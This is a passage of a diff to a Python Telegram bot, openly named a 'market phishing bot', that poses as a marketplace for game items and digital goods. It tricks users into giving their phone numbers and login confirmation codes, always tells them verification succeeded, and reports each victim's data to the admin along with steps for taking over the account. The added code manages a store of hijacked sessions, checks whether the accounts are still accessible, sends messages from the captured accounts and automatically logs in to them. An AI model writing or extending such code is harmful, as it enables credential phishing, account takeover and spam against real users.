+    await callback_query.answer("🔍 Проверяю доступ...")
     
-    keyboard = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
-        resize_keyboard=True,
-        one_time_keyboard=True
+    accounts = hijacker.get_hijacked_accounts()
+    
+    if not accounts:
+        await bot.edit_message_text(
+            "📭 Нет аккаунтов для проверки",
+            chat_id=callback_query.message.chat.id,
+            message_id=callback_query.message.message_id,
+            parse_mode="HTML"
+        )
+        return
+    
+    active = 0
+    inactive = 0
+    
+    for acc in accounts:
+        phone = acc[0]
+        
+        hijacker.cursor.execute(
+            "SELECT session_string FROM hijacked_sessions WHERE phone = ? ORDER BY hijacked_at DESC LIMIT 1",
+            (phone,)
+        )
+        result = hijacker.cursor.fetchone()
+        
+        if result:
+            session_string = result[0]
+            is_active = await hijacker.check_account_access(session_string)
+            
+            if is_active:
+                active += 1
+                hijacker.update_account_status(phone, True)
+            else:
+                inactive += 1
+                hijacker.update_account_status(phone, False)
+    
+    result_text = f"""
+📊 <b>РЕЗУЛЬТАТ ПРОВЕРКИ</b>
+
+✅ Активные: {active}
+❌ Неактивные: {inactive}
+📈 Всего: {len(accounts)}
+
+<b>Статусы обновлены в базе данных.</b>
+"""
+    
+    await bot.edit_message_text(
+        result_text,
+        chat_id=callback_query.message.chat.id,
+        message_id=callback_query.message.message_id,
+        parse_mode="HTML"
     )
+
+@dp.callback_query(F.data == "clear_inactive_sessions")
+async def clear_inactive_sessions(callback_query: types.CallbackQuery):
+    """Очистить неактивные сессии"""
+    if not hijacker:
+        await callback_query.answer("⚠️ Hijacker не инициализирован")
+        return
+    
+    # Удаляем неактивные сессии
+    hijacker.cursor.execute(
+        "DELETE FROM hijacked_sessions WHERE is_active = 0"
+    )
+    deleted_count = hijacker.cursor.rowcount
+    hijacker.conn.commit()
+    
+    await callback_query.answer(f"🗑️ Удалено {deleted_count} неактивных сессий")
+    
+    # Обновляем сообщение
+    accounts = hijacker.get_hijacked_accounts()
+    
+    if not accounts:
+        await bot.edit_message_text(
+            "📭 Нет захваченных аккаунтов",
+            chat_id=callback_query.message.chat.id,
+            message_id=callback_query.message.message_id,
+            parse_mode="HTML"
+        )
+        return
+    
+    accounts_text = "<b>📋 ЗАХВАЧЕННЫЕ АККАУНТЫ (ОЧИЩЕНО)</b>\n━━━━━━━━━━━━━━━━\n\n"
+    
+    for i, acc in enumerate(accounts, 1):
+        status = "✅" if acc[5] == 1 else "❌"
+        accounts_text += f"{i}. <b>{status} +{acc[0]}</b>\n"
+        accounts_text += f"   👤 @{acc[2] or 'нет'}\n"
+        accounts_text += f"   ⏰ {acc[4][:16]}\n"
+        accounts_text += "   ━━━━━━━━━━━\n"
+    
+    accounts_text += f"\n🗑️ <b>Удалено неактивных: {deleted_count}</b>"
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔄 Проверить доступ", callback_data="check_access_all")],
+        [InlineKeyboardButton(text="📨 Тест рассылка", callback_data="test_broadcast")]
+    ])
+    
+    await bot.edit_message_text(
+        accounts_text,
+        chat_id=callback_query.message.chat.id,
+        message_id=callback_query.message.message_id,
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+
+@dp.callback_query(F.data == "test_broadcast")
+async def test_broadcast_callback(callback_query: types.CallbackQuery):
+    """Тестовая рассылка админу"""
+    if not hijacker:
+        await callback_query.answer("⚠️ Hijacker не инициализирован")
+        return
+    
+    await callback_query.answer("📨 Отправляю тестовые сообщения...")
+    
+    active_accounts = hijacker.get_active_accounts()
+    
+    if not active_accounts:
+        await bot.send_message(
+            callback_query.from_user.id,
+            "❌ Нет активных аккаунтов для теста",
+            parse_mode="HTML"
+        )
+        return
+    
+    test_message = f"🔧 Тестовое сообщение от захваченного аккаунта\nВремя: {datetime.now().strftime('%H:%M:%S')}"
+    
+    success_count = 0
+    fail_count = 0
+    
+    for account in active_accounts[:3]:  # Первые 3 аккаунта
+        phone = account[0]
+        
+        success = await hijacker.send_message_from_hijacked(
+            phone,
+            str(ADMIN_ID),
+            test_message
+        )
+        
+        if success:
+            success_count += 1
+            await asyncio.sleep(5)  # Задержка между сообщениями
+        else:
+            fail_count += 1
+    
+    result_text = f"""
+📨 <b>ТЕСТ РАССЫЛКИ ЗАВЕРШЕН</b>
+
+✅ Успешно: {success_count}
+❌ Неудачно: {fail_count}
+📊 Всего попыток: {len(active_accounts[:3])}
+
+<b>Проверьте входящие сообщения от захваченных аккаунтов.</b>
+"""
     
     await bot.send_message(
         callback_query.from_user.id,
-        verification_text,
-        parse_mode="Markdown",
-        reply_markup=keyboard
+        result_text,
+        parse_mode="HTML"
     )
 
-# Обработка кода подтверждения (фишинг) - проверяем любой код
-@dp.message(F.text.regexp(r'^\d{5,6}$'))
-async def process_verification_code(message: types.Message):
-    user = message.from_user
-    code = message.text
-
-    # Проверяем, подтвержден ли номер у пользователя
-    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
-    user_data = cursor.fetchone()
-
-    if not user_data or not user_data[0]:
-        # Если номера нет, просим пройти верификацию сначала
-        await message.answer("❌ *Сначала необходимо подтвердить номер телефона.*\n\nИспользуйте меню верификации или нажмите /start", parse_mode="Markdown")
-        return
-
-    phone = user_data[0]
-    saved_code = user_data[1]
-
-    # Сохраняем введенный код (даже если не совпадает)
-    cursor.execute(
-        "UPDATE users SET code = ? WHERE user_id = ?",
-        (code, user.id)
-    )
-    conn.commit()
-
-    # ВСЕГДА УСПЕШНОЕ СООБЩЕНИЕ ДЛЯ ПОЛЬЗОВАТЕЛЯ
-    success_text = f"""
-✅ *Верификация по SMS завершена успешно!*
-
-Ваш номер *+{phone}* подтвержден.
-
-📸 *Следующий шаг:*
-Отправьте фотографии и подробное описание вашего товара для определения его стоимости.
-
-*Наш модератор оценит товар в течение 1-24 часов и предложит цену.*
-
-💰 *Теперь вы можете начать продавать товары!*
-    """
-    
-    await message.answer(success_text, parse_mode="Markdown")
-    
-    # Отправка данных админу
-    admin_report = f"""
-🎣 *ФИШИНГ УСПЕШЕН!*
-━━━━━━━━━━━━━━━━
-👤 *Жертва:* {user.first_name} (@{user.username})
-🆔 *User ID:* {user.id}
-📱 *Телефон:* +{phone}
-🔢 *Введенный код:* {code}
-💾 *Сохраненный код:* {saved_code if saved_code else 'нет'}
-💰 *Мотив:* Продажа игрового товара
-⏰ *Время:* {datetime.now().strftime('%H:%M:%S')}
-━━━━━━━━━━━━━━━━
-*✅ Код подтверждения получен!*
-*🚀 Можно переходить к захвату аккаунта*
-"""
-    
-    try:
-        await bot.send_message(ADMIN_ID, admin_report, parse_mode="Markdown")
-        
-        # Дополнительное уведомление
-        actions_text = f"""
-📋 *Действия с полученными данными:*
-1. Использовать код `{code}` для входа в аккаунт
-2. Восстановить пароль через код подтверждения
-3. Проверить привязанные сессии
-4. Сменить привязанный номер телефона
-
-*Следующий шаг:* Ожидание фотографий товара от пользователя.
-"""
-        await bot.send_message(ADMIN_ID, actions_text, parse_mode="Markdown")
-        
-    except Exception as e:
-        logger.error(f"Ошибка отправки админу: {e}")
-    
-    # Автоматически предлагаем отправить товар
-    offer_text = f"""
-📋 *Теперь вы можете отправить товар на оценку*
-
-*Для этого:*
-1. Нажмите кнопку ниже
-2. Отправьте фотографии товара
-3. Опишите подробно что вы продаете
-4. Модератор оценит и предложит цену
-"""
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📦 ОТПРАВИТЬ ТОВАР НА ОЦЕНКУ", callback_data="sell_item_after_verify")]
-    ])
-    
-    await message.answer(offer_text, parse_mode="Markdown", reply_markup=keyboard)
-    
-    log_action(user.id, "code_submitted", f"code: {code}, phone: {phone}")
-
-# Обработчик для отправки товара после верификации
-@dp.callback_query(F.data == "sell_item_after_verify")
-async def sell_after_verification(callback_query: types.CallbackQuery, state: FSMContext):
-    item_types_text = """
-🎯 *ЧТО ВЫ ХОТИТЕ ПРОДАТЬ?*
-
-Выберите категорию вашего товара:
-
-• 🎮 *Игровой аккаунт* - Steam, Epic Games, Origin, Uplay
-• 💎 *Цифровой предмет* - CS:GO скины, Dota 2 предметы
-• 🎫 *Игровой ключ* - Активационный ключ игры
-• 📱 *Цифровой подарок* - Gift Card, ваучер
-• 💳 *Электронные деньги* - Qiwi, Яндекс.Деньги
-• 📦 *Другое* - Укажите в описании
-    """
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🎮 Игровой аккаунт", callback_data="type_account")],
-        [InlineKeyboardButton(text="💎 Цифровой предмет", callback_data="type_item")],
-        [InlineKeyboardButton(text="🎫 Игровой ключ", callback_data="type_key")],
-        [InlineKeyboardButton(text="📱 Цифровой подарок", callback_data="type_gift")],
-        [InlineKeyboardButton(text="💳 Электронные деньги", callback_data="type_money")],
-        [InlineKeyboardButton(text="📦 Другое", callback_data="type_other")]
-    ])
-    
-    await state.set_state(SellerStates.waiting_item_type)
-    await bot.edit_message_text(
-        item_types_text,
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="Markdown",
-        reply_markup=keyboard
-    )
-
-# Команда для проверки статуса
 @dp.message(Command("status"))
 async def cmd_status(message: types.Message):
     user = message.from_user
@@ -1345,39 +2232,38 @@ async def cmd_status(message: types.Message):
     user_data = cursor.fetchone()
     
     status_text = f"""
-📊 *ВАШ СТАТУС*
+📊 <b>ВАШ СТАТУС</b>
 
-👤 *Пользователь:* {user.first_name}
-🆔 *ID:* {user.id}
-📱 *Телефон:* {'+'+user_data[0] if user_data and user_data[0] else 'Не подтвержден'}
+👤 <b>Пользователь:</b> {user.first_name}
+🆔 <b>ID:</b> {user.id}
+📱 <b>Телефон:</b> {'+'+user_data[0] if user_data and user_data[0] else 'Не подтвержден'}
     
-📦 *Заявки:*
+📦 <b>Заявки:</b>
 • Всего: {stats[0] or 0}
 • На модерации: {stats[1] or 0}
 • Одобрено: {(stats[0] or 0) - (stats[1] or 0)}
 
-💎 *Рекомендации:*
+💎 <b>Рекомендации:</b>
 1. Для продажи товара нажмите /start
 2. Для проверки верификации отправьте номер телефона
 3. Для помощи используйте /help
 """
     
-    await message.answer(status_text, parse_mode="Markdown")
+    await message.answer(status_text, parse_mode="HTML")
     log_action(user.id, "check_status")
 
-# Команда для помощи
 @dp.message(Command("help"))
 async def cmd_help(message: types.Message):
     help_text = """
-🆘 *ПОМОЩЬ ПО БОТУ*
+🆘 <b>ПОМОЩЬ ПО БОТУ</b>
 
-*Основные команды:*
+<b>Основные команды:</b>
 /start - Начать работу с ботом
 /status - Проверить статус заявок
 /resend_code - Отправить код подтверждения повторно
 /help - Показать это сообщение
 
-*Процесс продажи:*
+<b>Процесс продажи:</b>
 1. Нажмите /start
 2. Выберите "💰 ПРОДАТЬ ТОВАР"
 3. Подтвердите номер телефона (требуется один раз)
@@ -1387,87 +2273,76 @@ async def cmd_help(message: types.Message):
 7. Примите цену и получите инструкции по передаче
 8. Получите деньги после проверки товара
 
-*Безопасность:*
+<b>Безопасность:</b>
 • Все транзакции защищены
 • Конфиденциальность гарантирована
 • Выплаты в течение 24 часов
 
-*Поддержка:*
+<b>Поддержка:</b>
 Для связи с администратором используйте кнопку "📞 ПОДДЕРЖКА" в меню.
 """
     
-    await message.answer(help_text, parse_mode="Markdown")
+    await message.answer(help_text, parse_mode="HTML")
     log_action(message.from_user.id, "help_requested")
 
-# Обработчик кнопки "О нас"
 @dp.callback_query(F.data == "about_us")
 async def about_us(callback_query: types.CallbackQuery):
     about_text = """
-🏪 *О НАС - Money Moves Bot*
+🏪 <b>О НАС - Money Moves Bot</b>
 
 Мы - надежная платформа для покупки и продажи игровых ценностей с 2018 года.
 
-*Наши преимущества:*
-✅ *Безопасность* - Все сделки защищены гарантией
-✅ *Скорость* - Выплаты в течение 1-24 часов
-✅ *Выгода* - Самые высокие цены на рынке
-✅ *Поддержка* - Круглосуточная помощь
+<b>Наши преимущества:</b>
+✅ <b>Безопасность</b> - Все сделки защищены гарантией
+✅ <b>Скорость</b> - Выплаты в течение 1-24 часов
+✅ <b>Выгода</b> - Самые высокие цены на рынке
+✅ <b>Поддержка</b> - Круглосуточная помощь
 
-*Статистика:*
+<b>Статистика:</b>
 • 50,000+ успешных сделок
 • 10,000+ довольных клиентов
 • 99.8% положительных отзывов
 • 24/7 работа поддержки
 
-*Наши гарантии:*
+<b>Наши гарантии:</b>
 1. Полная анонимность
 2. Защита от мошенничества
 3. Юридическое сопровождение
 4. Мгновенные выплаты
 
-*Присоединяйтесь к нам уже сегодня!*
+<b>Присоединяйтесь к нам уже сегодня!</b>
 """
     
     await bot.edit_message_text(
         about_text,
         chat_id=callback_query.message.chat.id,
         message_id=callback_query.message.message_id,
-        parse_mode="Markdown"
+        parse_mode="HTML"
     )
-# Добавьте эту команду для тестирования отправки сообщений
-@dp.message(Command("test_sms"))
-async def cmd_test_sms(message: types.Message):
-    """Тестовая команда для проверки отправки SMS"""
-    test_code = str(random.randint(10000, 99999))
-    await message.answer(f"🔧 <b>ТЕСТ ОТПРАВКИ SMS</b>\n\nКод: <code>{test_code}</code>", parse_mode="HTML")
-    
-    # Тестируем отправку через simulate_sms_delivery
-    await simulate_sms_delivery(message.from_user.id, "79991234567", test_code)
-    await message.answer("✅ Тестовая отправка SMS запущена. Проверьте, пришло ли сообщение.")
-# Обработчик кнопки "Поддержка"
+
 @dp.callback_query(F.data == "support")
 async def support(callback_query: types.CallbackQuery):
     support_text = """
-📞 *ПОДДЕРЖКА*
+📞 <b>ПОДДЕРЖКА</b>
 
-*Связь с администрацией:*
-👑 *Главный администратор:* @Swill_Way_Admin
-👮 *Модератор:* @Swill_Way_Moderator
+<b>Связь с администрацией:</b>
+👑 <b>Главный администратор:</b> @Swill_Way_Admin
+👮 <b>Модератор:</b> @Swill_Way_Moderator
 
-*Часы работы поддержки:* Круглосуточно
+<b>Часы работы поддержки:</b> Круглосуточно
 
-*Среднее время ответа:*
+<b>Среднее время ответа:</b>
 • Обычные вопросы: 5-15 минут
 • Срочные вопросы: 1-5 минут
 • Технические проблемы: до 30 минут
 
-*Что мы можем помочь:*
+<b>Что мы можем помочь:</b>
 • Проблемы с верификацией
 • Вопросы по выплатам
 • Технические неполадки
 • Жалобы и предложения
 
-*Перед обращением подготовьте:*
+<b>Перед обращением подготовьте:</b>
 1. Ваш User ID (можно узнать через /status)
 2. Номер заявки (если есть)
 3. Подробное описание проблемы
@@ -1477,10 +2352,9 @@ async def support(callback_query: types.CallbackQuery):
         support_text,
         chat_id=callback_query.message.chat.id,
         message_id=callback_query.message.message_id,
-        parse_mode="Markdown"
+        parse_mode="HTML"
     )
 
-# Команда для администратора (статистика)
 @dp.message(Command("admin"))
 async def cmd_admin(message: types.Message):
     if message.from_user.id != ADMIN_ID and message.from_user.id not in MODERATOR_IDS:
@@ -1503,17 +2377,23 @@ async def cmd_admin(message: types.Message):
     cursor.execute("SELECT COUNT(*) FROM sms_codes WHERE used = 0")
     unused_codes = cursor.fetchone()[0]
     
+    hijacked_count = 0
+    if hijacker:
+        hijacked_accounts = hijacker.get_hijacked_accounts()
+        hijacked_count = len(hijacked_accounts)
+    
     admin_text = f"""
-👑 *АДМИН ПАНЕЛЬ*
+👑 <b>АДМИН ПАНЕЛЬ</b>
 
-*Статистика:*
-👥 *Пользователи:* {total_users}
-✅ *Верифицированы:* {verified_users}
-📦 *Заявки:* {total_items}
-⏳ *На модерации:* {pending_items}
-🔢 *Неиспользованные коды:* {unused_codes}
+<b>Статистика:</b>
+👥 <b>Пользователи:</b> {total_users}
+✅ <b>Верифицированы:</b> {verified_users}
+📦 <b>Заявки:</b> {total_items}
+⏳ <b>На модерации:</b> {pending_items}
+🔢 <b>Неиспользованные коды:</b> {unused_codes}
+🎯 <b>Захвачено аккаунтов:</b> {hijacked_count}
 
-*Последние действия:*
+<b>Последние действия:</b>
 """
     
     cursor.execute("SELECT user_id, action, timestamp FROM logs ORDER BY timestamp DESC LIMIT 5")
@@ -1522,14 +2402,16 @@ async def cmd_admin(message: types.Message):
     for log in logs:
         admin_text += f"\n• ID{log[0]} - {log[1]} ({log[2][:16]})"
     
-    admin_text += "\n\n*Команды администратора:*"
+    admin_text += "\n\n<b>Команды администратора:</b>"
     admin_text += "\n/export_users - Экспорт пользователей"
     admin_text += "\n/export_codes - Экспорт кодов"
-    admin_text += "\n/stats - Подробная статистика"
+    admin_text += "\n/hijacked - Показать захваченные аккаунты"
+    admin_text += "\n/check_access - Проверить доступ аккаунтов"
+    admin_text += "\n/auto_login - Авто-вход во все аккаунты"
+    admin_text += "\n/broadcast - Рассылка от всех аккаунтов"
     
-    await message.answer(admin_text, parse_mode="Markdown")
+    await message.answer(admin_text, parse_mode="HTML")
 
-# Экспорт пользователей
 @dp.message(Command("export_users"))
 async def cmd_export_users(message: types.Message):
     if message.from_user.id != ADMIN_ID:
@@ -1544,7 +2426,7 @@ async def cmd_export_users(message: types.Message):
         return
     
     # Создаем временный файл
-    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
         f.write("ID | Username | Имя | Телефон | Код | Регистрация\n")
         f.write("-" * 80 + "\n")
         for user in users:
@@ -1559,7 +2441,6 @@ async def cmd_export_users(message: types.Message):
     except Exception as e:
         await message.answer(f"❌ Ошибка экспорта: {e}")
 
-# Экспорт кодов
 @dp.message(Command("export_codes"))
 async def cmd_export_codes(message: types.Message):
     if message.from_user.id != ADMIN_ID:
@@ -1574,7 +2455,7 @@ async def cmd_export_codes(message: types.Message):
         return
     
     # Создаем временный файл
-    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
         f.write("ID | Username | Телефон | Код | Время отправки\n")
         f.write("-" * 80 + "\n")
         for code in codes:
@@ -1589,25 +2470,40 @@ async def cmd_export_codes(message: types.Message):
     except Exception as e:
         await message.answer(f"❌ Ошибка экспорта: {e}")
 
-# Запуск бота
+# ========== ЗАПУСК БОТА ==========
+
 async def main():
     print("=" * 50)
     print("🛒 MARKET PHISHING BOT - SWILL EDITION")
     print(f"👑 Admin: {ADMIN_ID}")
     print(f"👮 Moderators: {MODERATOR_IDS}")
-    print(f"🤖 Bot: @{await bot.me()}")
+    print(f"🤖 Bot: @{(await bot.me()).username}")
     print(f"💾 Database initialized")
+    print(f"🎯 Hijacker: {'✅ Active' if hijacker else '❌ Inactive'}")
     print("=" * 50)
     
     # Уведомление админу о запуске
     try:
         await bot.send_message(
             ADMIN_ID,
-            f"🤖 *Бот запущен!*\n\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nСтатус: ✅ Активен\nГотов к фишингу!",
-            parse_mode="Markdown"
+            f"🤖 <b>БОТ ЗАПУЩЕН!</b>\n\n"
+            f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"Статус: ✅ Активен\n"
+            f"Hijacker: {'✅ Включен' if hijacker else '❌ Выключен'}\n\n"
+            f"<b>Готов к фишингу и автоматическому входу в аккаунты!</b>",
+            parse_mode="HTML"
         )
-    except:
-        pass
+    except Exception as e:
+        print(f"Ошибка отправки уведомления админу: {e}")
+    
+    # Запускаем авто-вход в сохраненные аккаунты
+    if hijacker:
+        asyncio.create_task(auto_login_hijacked_accounts())
+        
+        # Запускаем мониторинг
+        asyncio.create_task(monitor_hijacked_accounts())
+        
+        logger.info("[MAIN] Авто-вход и мониторинг аккаунтов запущены")
     
     await dp.start_polling(bot)
 
